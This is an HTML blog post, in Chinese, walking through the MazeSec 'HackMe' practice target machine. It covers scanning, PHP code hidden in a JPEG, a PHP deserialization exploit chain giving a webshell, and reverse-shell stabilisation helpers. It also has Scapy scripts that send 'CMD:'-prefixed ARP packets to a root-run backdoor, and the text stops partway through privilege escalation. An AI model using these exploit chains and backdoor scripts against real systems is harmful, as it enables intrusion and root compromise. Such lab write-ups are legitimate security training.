@@ -1,0 +1,445 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>the0n3 - MazeSec Hackme</title>
+        <meta name="description" content="靶机不错，期待新作 靶机信息 名称：HackMe 作者：Joker-xue 系统：Linux 难度：Easy 来源：MazeSec/QQ公开群 321948805 官网：https://maze-sec.com/ 关键词：PHP反序列化、ARP命令注入、图片隐写、Linux提权 摘要：本文记录了 MazeSec Hac…">
+    <link rel="canonical" href="https://the0n3.top/posts/maze-hackme/">
+    <!-- Open Graph -->
+    <meta property="og:title" content="MazeSec Hackme">
+    <meta property="og:description" content="靶机不错，期待新作 靶机信息 名称：HackMe 作者：Joker-xue 系统：Linux 难度：Easy 来源：MazeSec/QQ公开群 321948805 官网：https://maze-sec.com/ 关键词：PHP反序列化、ARP命令注入、图片隐写、Linux提权 摘要：本文记录了 MazeSec Hac…">
+    <meta property="og:url" content="https://the0n3.top/posts/maze-hackme/">
+    <meta property="og:type" content="article">
+    <meta property="og:site_name" content="the0n3">
+    <meta property="og:locale" content="zh_CN">
+        <meta property="og:image" content="https://the0n3.top/images/maze-hackme/1.png">
+        <!-- Twitter Card -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="MazeSec Hackme">
+    <meta name="twitter:description" content="靶机不错，期待新作 靶机信息 名称：HackMe 作者：Joker-xue 系统：Linux 难度：Easy 来源：MazeSec/QQ公开群 321948805 官网：https://maze-sec.com/ 关键词：PHP反序列化、ARP命令注入、图片隐写、Linux提权 摘要：本文记录了 MazeSec Hac…">
+        <meta name="twitter:image" content="https://the0n3.top/images/maze-hackme/1.png">
+        <script>
+        (function () {
+            try {
+                var key = 'theme';
+                var saved = localStorage.getItem(key);
+                var theme = (saved === 'dark' || saved === 'light') ? saved : 'light';
+                document.documentElement.setAttribute('data-theme', theme);
+                document.documentElement.style.colorScheme = theme;
+            } catch (e) {
+                document.documentElement.setAttribute('data-theme', 'light');
+                document.documentElement.style.colorScheme = 'light';
+            }
+        })();
+    </script>
+    <!-- 使用 GitHub Markdown 样式 -->
+    <link rel="stylesheet" href="/assets/css/github-markdown.css">
+    <link rel="stylesheet" href="/assets/css/site.css">
+    <!-- 功能样式（自动扫描 assets/features/ 目录） -->
+        <link rel="stylesheet" href="/assets/features/code-fold/style.css">
+        <link rel="stylesheet" href="/assets/features/image-enhance/style.css">
+        <link rel="stylesheet" href="/assets/features/reading-progress/style.css">
+        <link rel="stylesheet" href="/assets/features/tax-accordion/style.css">
+        <link rel="stylesheet" href="/assets/css/nav-reveal.css">
+    <link rel="stylesheet" href="/assets/css/search.css">
+    <!-- 代码高亮样式 -->
+    <link rel="stylesheet" href="/assets/prism/prism.css">
+</head>
+<body>
+    <div class="reading-progress" aria-hidden="true">
+        <div class="reading-progress__bar"></div>
+    </div>
+    <header>
+        <nav>
+            <div class="nav-right">
+                                <a href="/">首页</a>
+                                <a href="/archives/">归档</a>
+                                <a href="/categories/">分类</a>
+                                <a href="/tags/">标签</a>
+                                <a href="/friends/">友链</a>
+                                <a href="/about/">关于</a>
+                                <a href="https://www.travellings.cn/go.html">开往</a>
+                                                <button
+                    id="searchTrigger"
+                    class="search-trigger"
+                    type="button"
+                    aria-label="打开搜索"
+                    aria-haspopup="dialog"
+                    aria-controls="searchModal"
+                    title="搜索（/）"
+                >
+                    <span class="search-trigger__label">搜索</span>
+                    <span class="search-trigger__hint">/</span>
+                </button>
+            </div>
+        </nav>
+    </header>
+                <div class="page-layout">
+            <main class="markdown-body">
+                
+<article class="post-content">
+    <h1>MazeSec Hackme</h1>
+    <p>
+        <span class="meta">发布于: 2026-03-30 19:50</span>
+    </p>
+    <div class="post-body">
+        <p>靶机不错，期待新作</p>
+<h2>靶机信息</h2>
+<p>名称：HackMe<br>
+作者：Joker-xue<br>
+系统：Linux<br>
+难度：Easy<br>
+来源：MazeSec/QQ公开群 321948805<br>
+官网：<a href="https://maze-sec.com/">https://maze-sec.com/</a>  </p>
+<p><strong>关键词</strong>：PHP反序列化、ARP命令注入、图片隐写、Linux提权</p>
+<p><strong>摘要</strong>：本文记录了 MazeSec HackMe 靶机的渗透过程。通过访问 80 端口发现的 JPEG 图片，利用 strings 工具提取出尾部隐藏的 PHP 反序列化代码，构造利用链获取初始 WebShell；在系统内发现 root 权限运行的 ARP 监听服务，通过分析服务逻辑并利用 Scapy 构造携带 CMD: 前缀的 ARP 广播包，绕过空格与重定向符过滤，实现无空格命令执行；最终通过该 ARP 后门直接以 root 权限读写系统文件，完成权限提升。该靶机重点考察了隐写分析、PHP 反序列化利用及非常规网络协议后门的挖掘能力。</p>
+<h2>信息收集</h2>
+<h3>存活主机扫描</h3>
+<p>arp-scan 扫描，靶机 IP 地址为 192.168.6.159</p>
+<pre><code class="language-bash">arp-scan 192.168.6.0/24</code></pre>
+<p>arp 扫描过程可以发现异样，靶机会持续响应 arp 请求</p>
+<p><img src="/images/maze-hackme/1.png" alt="" decoding="async" width="825" height="482"></p>
+<h3>端口扫描</h3>
+<p>nmap 扫描</p>
+<ul>
+<li>-p- 扫描所有端口</li>
+<li>-sS 使用 SYN 扫描,也称为半开放扫描，速度较快</li>
+<li>-n 不进行 DNS 解析，直接使用 IP 地址，提高扫描速度</li>
+</ul>
+<pre><code class="language-bash">nmap 192.168.6.159 -p- -sS -n
+
+PORT   STATE SERVICE
+80/tcp open  http</code></pre>
+<p>靶机仅开放了 80 端口</p>
+<h3>80 端口信息收集</h3>
+<p>访问 web 页面，返回一张图片</p>
+<p><img src="/images/maze-hackme/2.png" alt="" decoding="async" loading="lazy" width="1920" height="919"></p>
+<p>curl 请求一下</p>
+<pre><code class="language-bash">curl http://192.168.6.159</code></pre>
+<p>curl 警告内容是二进制数据，-o 参数保存为文件，使用 file 命令查看文件类型，一个jpeg 图片</p>
+<p><img src="/images/maze-hackme/3.png" alt="" decoding="async" loading="lazy" width="933" height="526"></p>
+<h2>图片分析</h2>
+<p>使用 strings 命令查看图片中的字符串，发现图片尾部追加了 php 代码，其中有段类似用户名密码的字符串，靶机没有开放 22 端口，猜测需要拿到反弹shell，内部登录ssh</p>
+<blockquote>
+<p>joker:@-joker-@-123421-@</p>
+</blockquote>
+<p><img src="/images/maze-hackme/4.png" alt="" decoding="async" loading="lazy" width="1251" height="754"></p>
+<h2>PHP反序列化</h2>
+<p>把这段 php 代码提取保存到 index.php 文件中，kali 使用 php 开个web服务，进行本地测试</p>
+<p><img src="/images/maze-hackme/5.png" alt="" decoding="async" loading="lazy" width="1315" height="851"></p>
+<p>把 php 反序列化 demo 喂给 deepseek ，拿到一个 exp</p>
+<pre><code class="language-php">&lt;?php
+class Starter {
+    public $obj;
+}
+
+class Middle {
+    public $target;
+}
+
+class Runner {
+    public $command;
+}
+
+// 构造利用链
+$runner = new Runner();
+$runner-&gt;command = "id";  // 要执行的命令
+
+$middle = new Middle();
+$middle-&gt;target = $runner;
+
+$starter = new Starter();
+$starter-&gt;obj = $middle;
+
+// 序列化
+$serialized = serialize($starter);
+echo "Serialized: " . $serialized . "\n";
+
+// Base64 编码
+$payload = base64_encode($serialized);
+echo "Payload: " . $payload . "\n";
+?&gt;</code></pre>
+<p><img src="/images/maze-hackme/7.png" alt="" decoding="async" loading="lazy" width="1179" height="712"></p>
+<p><img src="/images/maze-hackme/6.png" alt="" decoding="async" loading="lazy" width="1043" height="925"></p>
+<p>稳定 shell</p>
+<p><img src="/images/maze-hackme/8.png" alt="" decoding="async" loading="lazy" width="796" height="504"></p>
+<div class="callout callout-tip">
+<p>nc 稳定shell payload（自用）</p>
+</div>
+<p>xxx：拿到分配交互式伪终端payload<br>
+ctrl+Z 将反弹shell放到后台，执行yyy 的第一句进行输入处理，再执行剩余优化部分<br>
+yyy：拿到输入处理payload，以及后续优化体验  </p>
+<pre><code class="language-bash">echo 'export PATH="$HOME/.local/bin:$PATH"' &gt;&gt; ~/.zshrc
+source ~/.zshrc
+cat &lt;&lt; 'EOF' &gt; ~/.local/bin/xxx
+#!/bin/bash
+echo '
+
+/usr/bin/script  -qc /bin/bash /dev/null
+
+'
+EOF
+chmod +x ~/.local/bin/xxx
+cat &lt;&lt; 'EOF' &gt; ~/.local/bin/yyy
+#!/bin/bash
+echo '
+
+
+stty raw -echo; fg  
+
+
+export TERM=xterm  
+echo $SHELL  
+export SHELL=/bin/bash  
+
+'
+rows=$(stty size | awk '{print $1}')
+cols=$(stty size | awk '{print $2}')
+
+echo "stty rows $rows cols $cols"
+EOF
+chmod +x ~/.local/bin/yyy</code></pre>
+<h2>SSH 登录 joker</h2>
+<p>使用 joker:@-joker-@-123421-@ 凭证登录 ssh</p>
+<p><img src="/images/maze-hackme/9.png" alt="" decoding="async" loading="lazy" width="893" height="514"></p>
+<h2>进程信息发现</h2>
+<p>查看进程信息，发现 root 用户运行 /root/arp_server.py 脚本，并使用 systemctl 重启 arp-listener.service 服务</p>
+<p><img src="/images/maze-hackme/10.png" alt="" decoding="async" loading="lazy" width="1156" height="784"></p>
+<p>查看 arp-listener.service 服务信息，描述是 ARP Command Listener，猜测可能是后门，此处 arp 也与开头的 arp-scan 扫描时靶机持续响应 arp 请求有关</p>
+<pre><code class="language-bash">joker@hackme:~$ cat /etc/systemd/system/arp-listener.service
+[Unit]
+Description=ARP Command Listener
+After=network.target
+
+[Service]
+Type=simple
+ExecStart=/usr/bin/python3 /root/arp_server.py
+ExecStartPost=/bin/bash -c 'sleep 10 &amp;&amp; systemctl restart arp-listener.service'
+Restart=always
+RestartSec=3
+User=root
+
+[Install]
+WantedBy=multi-user.target</code></pre>
+<p>尝试单播 arp 请求，同时 tcpdump 监听过滤靶机的 arp 包，查看 arp 包信息</p>
+<pre><code class="language-bash">┌──(root㉿kali)-[~]
+└─# arping -c 3 -I eth0 192.168.6.159
+ARPING 192.168.6.159
+60 bytes from 08:00:27:ff:61:28 (192.168.6.159): index=0 time=242.990 usec
+108 bytes from 08:00:27:ff:61:28 (192.168.6.159): index=1 time=57.097 msec
+60 bytes from 08:00:27:ff:61:28 (192.168.6.159): index=2 time=194.439 usec
+108 bytes from 08:00:27:ff:61:28 (192.168.6.159): index=3 time=20.358 msec
+60 bytes from 08:00:27:ff:61:28 (192.168.6.159): index=4 time=204.087 usec
+108 bytes from 08:00:27:ff:61:28 (192.168.6.159): index=5 time=22.733 msec
+
+--- 192.168.6.159 statistics ---
+3 packets transmitted, 6 packets received,   0% unanswered (3 extra)
+rtt min/avg/max/std-dev = 0.194/16.805/57.097/20.400 ms                                                                       </code></pre>
+<p>tcpdump 监听过滤靶机的 arp 包，查看 arp 包信息，返回了 <code>CMD: 08:32:30 up 33 min</code>，执行了 uptime 命令</p>
+<pre><code class="language-bash">tcpdump -i eth0 host 192.168.6.159 -A</code></pre>
+<p>在 arp 包中发现了类似命令执行内容，<code>CMD: 08:32:30 up 33 min</code></p>
+<p><img src="/images/maze-hackme/11.png" alt="" decoding="async" loading="lazy" width="1006" height="625"></p>
+<p>猜测 arp_server.py 脚本会监听 arp 包中的命令内容，并执行命令，执行结果通过 arp 包返回</p>
+<p>使用脚本探测可能的利用方式</p>
+<pre><code class="language-python">#!/usr/bin/env python3
+from scapy.all import *
+import time
+
+TARGET = "192.168.6.159"
+INTERFACE = "eth0"
+
+def send_and_capture(cmd, method):
+    if method == "raw":
+        pkt = Ether(dst="ff:ff:ff:ff:ff:ff")
+        pkt /= ARP(pdst=TARGET)
+        pkt /= Raw(load=cmd)
+    elif method == "cmd_prefix":
+        pkt = Ether(dst="ff:ff:ff:ff:ff:ff")
+        pkt /= ARP(pdst=TARGET)
+        pkt /= Raw(load=f"CMD:{cmd}")
+    elif method == "exec_prefix":
+        pkt = Ether(dst="ff:ff:ff:ff:ff:ff")
+        pkt /= ARP(pdst=TARGET)
+        pkt /= Raw(load=f"EXEC:{cmd}")
+    elif method == "shell_prefix":
+        pkt = Ether(dst="ff:ff:ff:ff:ff:ff")
+        pkt /= ARP(pdst=TARGET)
+        pkt /= Raw(load=f"shell:{cmd}")
+    elif method == "run_prefix":
+        pkt = Ether(dst="ff:ff:ff:ff:ff:ff")
+        pkt /= ARP(pdst=TARGET)
+        pkt /= Raw(load=f"run:{cmd}")
+    elif method == "mac":
+        cmd_bytes = cmd.encode()[:6]
+        mac = ':'.join(f"{b:02x}" for b in cmd_bytes.ljust(6, b'\x00'))
+        pkt = Ether(src=mac, dst="ff:ff:ff:ff:ff:ff")
+        pkt /= ARP(pdst=TARGET)
+
+    print(f"[{method}] Sending: {cmd}")
+    sendp(pkt, iface=INTERFACE, verbose=False)
+
+    print(f"[{method}] Waiting 10 seconds for response...")
+    packets = sniff(filter=f"arp and host {TARGET}", timeout=10, iface=INTERFACE)
+
+    if packets:
+        for pkt in packets:
+            print(f"[{method}] Response received:")
+            if Raw in pkt:
+                data = pkt[Raw].load.decode('utf-8', errors='ignore')
+                print(f"  Data: {data}")
+            else:
+                pkt.show()
+    else:
+        print(f"[{method}] No response after 10 seconds")
+
+    print()
+
+print("Testing ARP backdoor")
+print(f"Target: {TARGET}\n")
+
+methods = ["raw", "cmd_prefix", "exec_prefix", "shell_prefix", "run_prefix", "mac"]
+
+for method in methods:
+    send_and_capture("id", method)
+
+print("Test complete")</code></pre>
+<p>测试发现，只有带有 <code>CMD:</code> 前缀的 arp 包会被执行，并通过 arp 包返回结果</p>
+<p><img src="/images/maze-hackme/12.png" alt="" decoding="async" loading="lazy" width="1118" height="870"></p>
+<pre><code class="language-python">#!/usr/bin/env python3
+import sys
+from scapy.all import *
+
+TARGET = "192.168.6.159"
+INTERFACE = "eth0"
+
+def execute_command(command):
+    pkt = Ether(dst="ff:ff:ff:ff:ff:ff")
+    pkt /= ARP(pdst=TARGET)
+    pkt /= Raw(load=f"CMD:{command}")
+
+    sendp(pkt, iface=INTERFACE, verbose=False)
+
+    packets = sniff(filter=f"arp and host {TARGET}", timeout=10, iface=INTERFACE)
+
+    for pkt in packets:
+        if Raw in pkt:
+            return pkt[Raw].load.decode('utf-8', errors='ignore')
+    return "No response"
+
+if len(sys.argv) &lt; 2:
+    print("Usage: python3 exp.py &lt;command&gt;")
+    print("Example: python3 exp.py id")
+    sys.exit(1)
+
+command = sys.argv[1]
+result = execute_command(command)
+print(result)</code></pre>
+<p>似乎不能有空格，有空格时命令不会执行</p>
+<p><img src="/images/maze-hackme/13.png" alt="" decoding="async" loading="lazy" width="893" height="392"></p>
+<p>重定向符号 &gt; 也会检测</p>
+<p><img src="/images/maze-hackme/14.png" alt="" decoding="async" loading="lazy" width="910" height="298"></p>
+<p>直接执行可执行脚本会报错</p>
+<p><img src="/images/maze-hackme/15.png" alt="" decoding="async" loading="lazy" width="580" height="153"></p>
+<p><img src="/images/maze-hackme/16.png" alt="" decoding="async" loading="lazy" width="858" height="283"></p>
+<p>补充 shebang 行可以正常执行</p>
+<p><img src="/images/maze-hackme/17.png" alt="" decoding="async" loading="lazy" width="1175" height="481"></p>
+<p><img src="/images/maze-hackme/18.png" alt="" decoding="async" loading="lazy" width="941" height="420"></p>    </div>
+    </article>
+
+
+<section class="post-comments" aria-label="Comments">
+    <script src="https://giscus.app/client.js"
+        data-repo="Apursuit/the0n3-blog"
+        data-repo-id="R_kgDORvPPbA"
+        data-category="Announcements"
+        data-category-id="DIC_kwDORvPPbM4C5KAt"
+        data-mapping="pathname"
+        data-strict="0"
+        data-reactions-enabled="1"
+        data-emit-metadata="0"
+        data-input-position="bottom"
+        data-theme="light"
+        data-lang="zh-CN"
+        crossorigin="anonymous"
+        async>
+    </script>
+</section>
+
+            </main>
+                <aside class="post-toc" aria-label="Table of contents">
+        <div class="toc-title">目录</div>
+        <nav class="toc-list"></nav>
+    </aside>
+            </div>
+    
+    <!-- 搜索命令面板：
+         第一版先提供标题、日期、标签搜索，以及键盘导航和快捷键 -->
+    <div id="searchModal" class="search-modal" hidden>
+        <div class="search-modal__overlay" data-search-close></div>
+        <div class="search-modal__dialog" role="dialog" aria-modal="true" aria-labelledby="searchModalTitle">
+            <div class="search-modal__panel">
+                <div class="search-modal__header">
+                    <div class="search-modal__title-group">
+                        <div id="searchModalTitle" class="search-modal__title">搜索文章</div>
+                        <div class="search-modal__subtitle">输入标题、标签或关键词，按 Enter 打开结果</div>
+                    </div>
+                    <button
+                        id="searchClose"
+                        class="search-modal__close"
+                        type="button"
+                        aria-label="关闭搜索"
+                        title="关闭搜索"
+                    >
+                        ×
+                    </button>
+                </div>
+
+                <div class="search-modal__body">
+                    <label class="search-input-wrap" for="searchInput">
+                        <span class="search-input-wrap__icon" aria-hidden="true">⌕</span>
+                        <input
+                            id="searchInput"
+                            class="search-input"
+                            type="text"
+                            placeholder="搜索文章..."
+                            autocomplete="off"
+                            spellcheck="false"
+                        >
+                    </label>
+
+                    <div class="search-help">
+                        <span>/ 打开</span>
+                        <span>↑ ↓ 选择</span>
+                        <span>Enter 打开</span>
+                        <span>Esc 关闭</span>
+                    </div>
+
+                    <div id="searchState" class="search-state" aria-live="polite">输入关键词开始搜索</div>
+                    <div id="searchResults" class="search-results" role="listbox" aria-label="搜索结果"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <button id="backToTop" class="fab fab-top" type="button" aria-label="返回顶部" title="返回顶部">↑</button>
+    <button id="themeToggle" class="theme-toggle" type="button" aria-label="切换主题" title="切换主题"></button>
+    <script src="/assets/js/site.js"></script>
+    <!-- 功能脚本（自动扫描 assets/features/ 目录） -->
+        <script src="/assets/features/code-fold/script.js"></script>
+        <script src="/assets/features/image-enhance/script.js"></script>
+        <script src="/assets/features/reading-progress/script.js"></script>
+        <script src="/assets/features/tax-accordion/script.js"></script>
+        <script src="/assets/js/navReveal.js"></script>
+    <!-- 启动代码高亮及行号显示 -->
+    <script src="/assets/prism/prism.js"></script>
+    <script src="/assets/prism/prism-line-number.js"></script>
+    <!-- 主题切换 -->
+    <script src="/assets/js/ThemeSwitch.js"></script>
+    <!-- 弹簧动画工具（搜索弹窗/灯箱进出场依赖） -->
+    <script src="/assets/js/spring.js"></script>
+    <!-- 搜索功能 -->
+    <script src="/assets/js/fuse.js"></script>
+    <script src="/assets/js/search.js"></script>
+</body>
+</html>
